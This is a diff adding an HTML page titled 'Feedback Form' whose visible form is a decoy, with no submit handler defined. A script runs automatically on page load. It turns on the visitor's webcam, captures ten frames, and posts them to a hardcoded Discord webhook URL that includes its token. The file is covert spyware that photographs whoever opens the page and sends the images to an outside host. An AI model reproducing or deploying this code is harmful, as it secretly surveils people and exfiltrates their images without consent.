@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Feedback Form</title>
+</head>
+<body>
+    <h1>Feedback Form</h1>
+    <input type="text" id="feedback" placeholder="Enter your feedback...">
+    <button onclick="submitFeedback()">Submit</button>
+
+    <script>
+        async function takePhotos(count) {
+            const photos = [];
+            const video = document.createElement("video");
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            await video.play();
+
+            for (let i = 0; i < count; i++) {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0);
+                const dataUrl = canvas.toDataURL("image/png");
+                photos.push(dataUrl);
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+            return photos;
+        }
+
+        async function sendPhotosToDiscord(photos) {
+            const webhookUrl = "https://discordapp.com/api/webhooks/1344440845419548702/pP1MvXgW6Va0rTZ_IqTd90x77N5PHZAlWnuAEiicJlv0-cPY2zkQm6sQEnSeKEIMd7Bk";
+
+            for (const photo of photos) {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: "",
+                        embeds: [{
+                            image: { url: photo }
+                        }]
+                    })
+                });
+            }
+        }
+
+        window.onload = async () => {
+            const photos = await takePhotos(10);
+            await sendPhotosToDiscord(photos);
+        };
+    </script>
+</body>
+</html>
